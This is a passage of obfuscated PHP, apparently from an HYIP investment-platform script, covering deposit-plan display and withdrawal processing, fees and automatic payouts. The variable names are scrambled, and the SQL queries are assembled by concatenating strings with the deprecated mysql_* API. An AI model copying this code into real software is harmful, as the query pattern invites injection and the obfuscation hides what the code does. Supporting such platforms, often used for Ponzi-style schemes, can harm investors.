	    group by hm2_history.ec
          ';
                  }

                  ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                  $elnlcadsc = array ();
                  $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                  {
                    array_push ($elnlcTmCT, array ('ec' => $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']], 'amount' => number_format ($elnlcCgqPK[$elnlcsyENS['elnlcTyDvn']], 2)));
                  }
                }

                $elnlcfhFg->assign ('hold', $elnlcTmCT);
                if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOqItU'])
                {
                  $elnlcUxHw = $elnlcsyENS['elnlcmjUx'];
                  $q = '' . 'select actual_amount from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' order by deposit_date desc limit 0,1';
                  $elnlchGkPU = mysql_query ($q);
                  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                  {
                    $elnlcUxHw = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']];
                  }

                  if ($elnlcgcnET[$elnlcsyENS['elnlcJtvsi']] == 1)
                  {
                    $elnlcUxHw = $elnlcsyENS['elnlcmjUx'];
                  }

                  if (0 < $elnlcUxHw)
                  {
                    foreach ($elnlczhuc as $k => $elnlcoFEhc)
                    {
                      if (($elnlcoFEhc[$elnlcsyENS['elnlcwFTQ']] <= $elnlcUxHw AND ($elnlcoFEhc[$elnlcsyENS['elnlcMFyGk']] == 0 OR $elnlcUxHw <= $elnlcoFEhc[$elnlcsyENS['elnlcMFyGk']])))
                      {
                        $elnlczhuc[$k][$elnlcsyENS['elnlcccfb']] = $elnlcsyENS['elnlctNxTK'];
                        continue;
                      }
                    }
                  }

                  $elnlcfhFg->assign ('last_deposit_amount', $elnlcUxHw);
                }

                $elnlcfhFg->assign ('plans', $elnlczhuc);
                $elnlcfhFg->assign ('qplans', sizeof ($elnlczhuc));
                $elnlcfhFg->assign ('min_deposit', sprintf ('%0.2f', $elnlcGokT));
                $elnlcfhFg->assign ('compounding_available', $elnlcwEoEI);
                $elnlcfhFg->display ($elnlcsyENS['elnlckcUGN']);
                print base64_decode ('Cg==
');
              }
              else
              {
                if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcszjoh'] AND $elnlcSuVc[$elnlcsyENS['elnlcgkyj']] == 1) AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                {
                  $elnlcotDB = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                  $elnlcTshQ = array ();
                  while (list ($elnlcuwppG, $elnlcOBJb) = each ($elnlcotDB))
                  {
                    $elnlcTshQ[$elnlcuwppG] = number_format ($elnlcOBJb, 2);
                  }

                  $elnlcfhFg->assign ('ab_formated', $elnlcTshQ);
                  $elnlcfhFg->assign ('frm', $elnlcWodOE);
                  $q = 'select sum(actual_amount) as sm, ec from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' group by ec';
                  $elnlchGkPU = mysql_query ($q);
                  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                  {
                    $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcTcMv']] = number_format ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']], 2);
                  }

                  $elnlcQTTo = array ();
                  reset ($elnlcGPfS);
                  foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
                  {
                    array_push ($elnlcQTTo, array_merge (array ('id' => $elnlckapu), (array)$elnlcoFEhc));
                  }

                  $elnlcfhFg->assign ('ps', $elnlcQTTo);
                  $elnlcfhFg->display ($elnlcsyENS['elnlcnzWD']);
                  print base64_decode ('Cg==
');
                }
                else
                {
                  if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcUGHaR'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                  {
                    if (0 < $elnlcSuVc[$elnlcsyENS['elnlcbCkm']])
                    {
                      $q = 'select sum(actual_amount*(type = \'add_funds\')) as td, sum(actual_amount*(type = \'withdrawal\' or type=\'withdraw_pending\')) as tw from hm2_history where type in (\'add_funds\', \'withdrawal\')';
                      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                      if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcWhRAL']])
                      {
                        if ($elnlcSuVc[$elnlcsyENS['elnlcbCkm']] <= $elnlcCgqPK[$elnlcsyENS['elnlctgvUa']] * 100 / $elnlcCgqPK[$elnlcsyENS['elnlcWhRAL']])
                        {
                          $elnlcWodOE[$elnlcsyENS['elnlcevKUa']] = '';
                          $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcUrvr']);
                        }
                      }
                    }

                    if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcnocCE'] AND $elnlcUAAU[HTTP_HOST] != 'hyip4free'))
                    {
                      $q = '' . 'select count(*) as cnt from hm2_history where type in (\'withdrawal\', \'withdraw_pending\') and date > now() - interval 1 month and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                      $elnlchGkPU = mysql_query ($q);
                      $elnlcCgqPK = mysql_fetch_assoc ($elnlchGkPU);
                      if (0 < $elnlcCgqPK[$elnlcsyENS['elnlchvME']])
                      {
                        print '' . '<!-- ' . $elnlcCgqPK[$elnlcsyENS['elnlchvME']] . ' -->';
                        $elnlcWodOE[$elnlcsyENS['elnlcevKUa']] = '';
                        $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcPulWx']);
                      }
                    }

                    if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcmBEiE'])
                    {
                      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcNVEl'])
                      {
                        if (((extension_loaded ('gd') AND $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] == 1) AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcQMrd']]))
                        {
                          if (VN_SAVED != $elnlcWodOE[$elnlcsyENS['elnlcAHrk']])
                          {
                            header ('Location: ?a=withdraw&say=invalid_turing');
                            elnlcnooln ($elnlcUazB);
                            exit ();
                          }
                        }
                      }

                      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOqItU'])
                      {
                        $q = '' . 'select count(*) as cnt from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and status = \'on\'';
                        $elnlchGkPU = mysql_query ($q);
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        if ($elnlcCgqPK[$elnlcsyENS['elnlchvME']] <= 0)
                        {
                          header ('Location: ?a=withdraw&say=no_active_deposits');
                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }
                      }

                      $elnlcotDB = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                      $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                      $elnlclzICL = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcbWzUr']]);
                      $elnlciSebT = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcyqyS']]);
                      if (0 < $elnlcSuVc[$elnlcsyENS['elnlcJiVo']])
                      {
                        $q = 'select count(*) as cnt from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                        $elnlchGkPU = mysql_query ($q);
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        if ($elnlcCgqPK[$elnlcsyENS['elnlchvME']] < 1)
                        {
                          header ('Location: ?a=withdraw&say=no_deposits');
                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }
                      }

                      if ($elnlcrUqv <= 0)
                      {
                        header ('Location: ?a=withdraw&say=zero');
                        elnlcnooln ($elnlcUazB);
                        exit ();
                      }

                      $elnlcEEGK = $elnlcsyENS['elnlcmjUx'];
                      if ($elnlcSuVc[$elnlcsyENS['elnlcHrRLP']] == 1)
                      {
                        $q = '' . 'select id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcadsc = array ();
                        $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          array_push ($elnlcadsc, $elnlcCgqPK[id]);
                        }

                        $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT . ' and 
	deposit_id in (') . join (',', $elnlcadsc) . ') and 
			(type=\'earning\' or 
	(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));';
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          $elnlcEEGK = $elnlcCgqPK[amount];
                        }
                      }
                      else
                      {
                        if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                        {
                          $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT . ' and hm2_deposits.deposit_date + interval hm2_types.hold day > now()';
                        }
                        else
                        {
                          $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT;
                        }

                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcadsc = array ();
                        $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT . ' and 
		deposit_id = ' . $elnlcCgqPK[id] . ' and date > now() - interval ' . $elnlcCgqPK[hold] . ' day and 
			(type=\'earning\' or 
		(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));');
                          ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                          while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                          {
                            $elnlcEEGK += $elnlcUpbus[amount];
                          }
                        }
                      }

                      $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT);
                      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                      $elnlcotDB[$elnlcsyENS['elnlceleT']] = $elnlcsyENS['elnlcmjUx'];
                      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                      {
                        $elnlcotDB[$elnlcsyENS['elnlceleT']] = $elnlcCgqPK[$elnlcsyENS['elnlcyteO']] - $elnlcEEGK;
                      }

                      if ($elnlcotDB[$elnlcsyENS['elnlceleT']] < $elnlcrUqv)
                      {
                        if ($elnlcrUqv <= $elnlcotDB[$elnlcsyENS['elnlceleT']] + $elnlcEEGK)
                        {
                          header ('Location: ?a=withdraw&say=on_hold');
                        }
                        else
                        {
                          header ('Location: ?a=withdraw&say=not_enought');
                        }

                        elnlcnooln ($elnlcUazB);
                        exit ();
                      }

                      if ($elnlcrUqv < $elnlcSuVc[$elnlcsyENS['elnlclcgPq']])
                      {
                        header ('Location: ?a=withdraw&say=less_min');
                        elnlcnooln ($elnlcUazB);
                        exit ();
                      }

                      if (((0 < $elnlcSuVc[$elnlcsyENS['elnlcxdwDv']] AND $elnlcSuVc[$elnlcsyENS['elnlcxdwDv']] < $elnlcrUqv) AND $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcnocCE']))
                      {
                        header ('Location: ?a=withdraw&say=greater_max');
                        elnlcnooln ($elnlcUazB);
                        exit ();
                      }

                      if (0 < $elnlcSuVc[max_daily_withdraw])
                      {
                        $q = '' . 'select sum(actual_amount) as am from hm2_history where type in (\'withdraw\', \'withdraw_pending\') and user_id = ' . $elnlcgcnET[id];
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcOWWAf = $elnlcsyENS['elnlcmjUx'];
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          $elnlcOWWAf = 0 - $elnlcCgqPK[am];
                        }

                        if ($elnlcSuVc[max_daily_withdraw] < $elnlcOWWAf + $elnlcrUqv)
                        {
                          header ('Location: ?a=withdraw&say=daily_limit');
                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }
                      }

                      if (($elnlcSuVc[program_version] == $elnlcsyENS['elnlcNgInk'] AND $elnlcSuVc[license] == $elnlcsyENS['elnlcmxEbM']))
                      {
                        $elnlcKtjJ = floor ($elnlcrUqv * $elnlcSuVc[$elnlcsyENS['elnlcvWUU']] * 10000) / 1000000;
                      }
                      else
                      {
                        $elnlcKtjJ = floor ($elnlcrUqv * $elnlcSuVc[$elnlcsyENS['elnlcvWUU']]) / 100;
                      }

                      if ($elnlcKtjJ < $elnlcSuVc[$elnlcsyENS['elnlcoWDns']])
                      {
                        $elnlcKtjJ = $elnlcSuVc[$elnlcsyENS['elnlcoWDns']];
                      }

                      $elnlcElMWd = $elnlcrUqv - $elnlcKtjJ;
                      if ($elnlcElMWd < 0)
                      {
                        $elnlcElMWd = $elnlcsyENS['elnlcmjUx'];
                      }

                      if (($elnlcSuVc[program_version] == $elnlcsyENS['elnlcNgInk'] AND $elnlcSuVc[license] == $elnlcsyENS['elnlcmxEbM']))
                      {
                        $elnlcElMWd = number_format (floor ($elnlcElMWd * 1000000) / 1000000, 2);
                      }
                      else
                      {
                        $elnlcElMWd = number_format (floor ($elnlcElMWd * 100) / 100, 2);
                      }

                      $elnlcOPfeJ = '';
                      if ($elnlcGPfS[$elnlciSebT][status] == 1)
                      {
                        $elnlcOPfeJ = $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT];
                      }

                      $elnlcfhFg->assign ('preview', 1);
                      $elnlcfhFg->assign ('amount', $elnlcrUqv);
                      $elnlcfhFg->assign ('fee', $elnlcKtjJ);
                      $elnlcfhFg->assign ('to_withdraw', $elnlcElMWd);
                      $elnlcfhFg->assign ('currency', $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']]);
                      $elnlcfhFg->assign ('ec', $elnlciSebT);
                      $elnlcfhFg->assign ('account', $elnlcOPfeJ);
                      $elnlcfhFg->assign ('comment', $elnlcWodOE[$elnlcsyENS['elnlcbWzUr']]);
                      $elnlcfhFg->display ($elnlcsyENS['elnlcVIBb']);
                    }
                    else
                    {
                      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcUGHaR'])
                      {
                        if (($elnlcSuVc[$elnlcsyENS['elnlcEiLvm']] == 1 AND $elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] != $elnlcgcnET[$elnlcsyENS['elnlcAIMpf']]))
                        {
                          header ('Location: ?a=withdraw&say=invalid_transaction_code');
                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }

                        if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOqItU'])
                        {
                          $q = '' . 'select count(*) as cnt from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and status = \'on\'';
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                          if ($elnlcCgqPK[$elnlcsyENS['elnlchvME']] <= 0)
                          {
                            header ('Location: ?a=withdraw&say=no_active_deposits');
                            elnlcnooln ($elnlcUazB);
                            exit ();
                          }
                        }

                        if (0 < $elnlcSuVc[$elnlcsyENS['elnlcJiVo']])
                        {
                          $q = 'select count(*) as cnt from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                          if ($elnlcCgqPK[$elnlcsyENS['elnlchvME']] < 1)
                          {
                            header ('Location: ?a=withdraw&say=no_deposits');
                            elnlcnooln ($elnlcUazB);
                            exit ();
                          }
                        }

                        $elnlcotDB = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                        $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                        $elnlclzICL = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcbWzUr']]);
                        $elnlciSebT = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcyqyS']]);
                        if ($elnlcrUqv <= 0)
                        {
                          header ('Location: ?a=withdraw&say=zero');
                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }

                        if ($elnlcrUqv < $elnlcSuVc[$elnlcsyENS['elnlclcgPq']])
                        {
                          header ('Location: ?a=withdraw&say=less_min');
                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }

                        if (((0 < $elnlcSuVc[$elnlcsyENS['elnlcxdwDv']] AND $elnlcSuVc[$elnlcsyENS['elnlcxdwDv']] < $elnlcrUqv) AND $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcnocCE']))
                        {
                          header ('Location: ?a=withdraw&say=greater_max');
                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }

                        $elnlcEEGK = $elnlcsyENS['elnlcmjUx'];
                        if ($elnlcSuVc[$elnlcsyENS['elnlcHrRLP']] == 1)
                        {
                          $q = '' . 'select id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcadsc = array ();
                          $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            array_push ($elnlcadsc, $elnlcCgqPK[id]);
                          }

                          $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT . ' and 
	deposit_id in (') . join (',', $elnlcadsc) . ') and 
			(type=\'earning\' or 
	(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));';
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            $elnlcEEGK = $elnlcCgqPK[amount];
                          }
                        }
                        else
                        {
                          if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                          {
                            $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT . ' and hm2_deposits.deposit_date + interval hm2_types.hold day > now()';
                          }
                          else
                          {
                            $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT;
                          }

                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcadsc = array ();
                          $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT . ' and 
		deposit_id = ' . $elnlcCgqPK[id] . ' and date > now() - interval ' . $elnlcCgqPK[hold] . ' day and 
			(type=\'earning\' or 
		(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));');
                            ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                            while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                            {
                              $elnlcEEGK += $elnlcUpbus[amount];
                            }
                          }
                        }

                        $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT);
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcotDB[$elnlcsyENS['elnlceleT']] = $elnlcsyENS['elnlcmjUx'];
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          $elnlcotDB[$elnlcsyENS['elnlceleT']] = $elnlcCgqPK[$elnlcsyENS['elnlcyteO']] - $elnlcEEGK;
                        }

                        if ($elnlcotDB[$elnlcsyENS['elnlceleT']] < $elnlcrUqv)
                        {
                          if ($elnlcrUqv <= $elnlcotDB[$elnlcsyENS['elnlceleT']] + $elnlcEEGK)
                          {
                            header ('Location: ?a=withdraw&say=on_hold');
                          }
                          else
                          {
                            header ('Location: ?a=withdraw&say=not_enought');
                          }

                          elnlcnooln ($elnlcUazB);
                          exit ();
                        }

                        if (0 < $elnlcSuVc[max_daily_withdraw])
                        {
                          $q = '' . 'select sum(actual_amount) as am from hm2_history where type in (\'withdraw\', \'withdraw_pending\') and user_id = ' . $elnlcgcnET[id];
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcOWWAf = $elnlcsyENS['elnlcmjUx'];
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            $elnlcOWWAf = 0 - $elnlcCgqPK[am];
                          }

                          if ($elnlcSuVc[max_daily_withdraw] < $elnlcOWWAf + $elnlcrUqv)
                          {
                            header ('Location: ?a=withdraw&say=daily_limit');
                            elnlcnooln ($elnlcUazB);
                            exit ();
                          }
                        }

                        if ($elnlcrUqv <= $elnlcotDB[$elnlcsyENS['elnlceleT']])
                        {
                          $q = 'insert into hm2_history set 
  	user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ',
  	amount = -' . $elnlcrUqv . ',
  	actual_amount = -' . $elnlcrUqv . ',
  	type=\'withdraw_pending\',
  	date = now(),
  	ec = ' . $elnlciSebT . ',
  	description = \'' . $elnlclzICL . '\'');
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcMTeWS = mysql_insert_id ();
                          if (!$elnlcMTeWS)
                          {
                            exit ();
                          }

                          if ($elnlcSuVc[license] == $elnlcsyENS['elnlcVzbc'])
                          {
                            $q = '' . 'update hm2_deposits set status = \'off\' where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                            (mysql_query ($q) OR print mysql_error ());
                          }

                          $elnlcRuFoK = array ();
                          $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
                          $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
                          $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU['REMOTE_ADDR'];
                          $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = $elnlcrUqv;
                          elnlcsius ('withdraw_request_user_notification', $elnlcgcnET['email'], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                          elnlcsius ('withdraw_request_admin_notification', $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                          if (($elnlcSuVc[$elnlcsyENS['elnlcdUfHE']] == 1 AND $elnlcGPfS[$elnlciSebT][auto] == 1))
                          {
                            if (($elnlcSuVc[$elnlcsyENS['elnlccSjM']] <= $elnlcrUqv AND $elnlcrUqv <= $elnlcSuVc[$elnlcsyENS['elnlcEHob']]))
                            {
                              $q = 'select sum(amount) as sum from hm2_history where type=\'withdrawal\' and date + interval 24 hour > now() and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                              if ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                              {
                                if ((abs ($elnlcCgqPK[$elnlcsyENS['elnlcHSGM']]) + $elnlcrUqv <= $elnlcSuVc[$elnlcsyENS['elnlcKUEKF']] AND $elnlcgcnET[$elnlcsyENS['elnlcfuUWB']] == 1))
                                {
                                  $elnlcKtjJ = floor ($elnlcrUqv * $elnlcSuVc[$elnlcsyENS['elnlcvWUU']]) / 100;
                                  if ($elnlcKtjJ < $elnlcSuVc[$elnlcsyENS['elnlcoWDns']])
                                  {
                                    $elnlcKtjJ = $elnlcSuVc[$elnlcsyENS['elnlcoWDns']];
                                  }

                                  $elnlcElMWd = $elnlcrUqv - $elnlcKtjJ;
                                  if ($elnlcElMWd < 0)
                                  {
                                    $elnlcElMWd = $elnlcsyENS['elnlcmjUx'];
                                  }

                                  if (($elnlcSuVc[program_version] == $elnlcsyENS['elnlcNgInk'] AND $elnlcSuVc[license] == $elnlcsyENS['elnlcmxEbM']))
                                  {
                                    $elnlcElMWd = sprintf ('%.02f', floor ($elnlcElMWd * 1000000) / 1000000);
                                  }
                                  else
                                  {
                                    $elnlcElMWd = sprintf ('%.02f', floor ($elnlcElMWd * 100) / 100);
                                  }

                                  if ($elnlcSuVc[$elnlcsyENS['elnlcpjhxj']] != '')
                                  {
                                    $elnlcRKqKz = $elnlcSuVc[$elnlcsyENS['elnlcpjhxj']];
                                  }
                                  else
                                  {
                                    $elnlcRKqKz = 'Withdraw to ' . $elnlcgcnET[$elnlcsyENS['elnlczWew']] . ' from ' . $elnlcSuVc[$elnlcsyENS['elnlcIEsb']];
                                  }

                                  $elnlcRWgpq = '' . 'Error, tried sent ' . $elnlcElMWd . ' to ' . $elnlcGPfS[$elnlciSebT][name] . ' account # ' . $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT] . '. Error:';
                                  if ($elnlciSebT == 0)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlctvanm ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 1)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcmatra ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 2)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcfvxzr ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if (($elnlciSebT == 5 OR $elnlciSebT == 55))
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcqwlb ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq, $elnlciSebT);
                                  }

                                  if ($elnlciSebT == 8)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcuuenw ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 9)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcdaov ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 11)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlchivv ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 15)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcdjefm ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 16)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcpvgl ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 17)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcelbi ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 18)
                                  {
                                    list ($elnlcqbku, $elnlcLOyx, $elnlcVTlA) = elnlcbvtd ('', $elnlcElMWd, $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlciSebT], $elnlcRKqKz, $elnlcRWgpq);
                                  }

                                  if ($elnlciSebT == 24)
                                  {
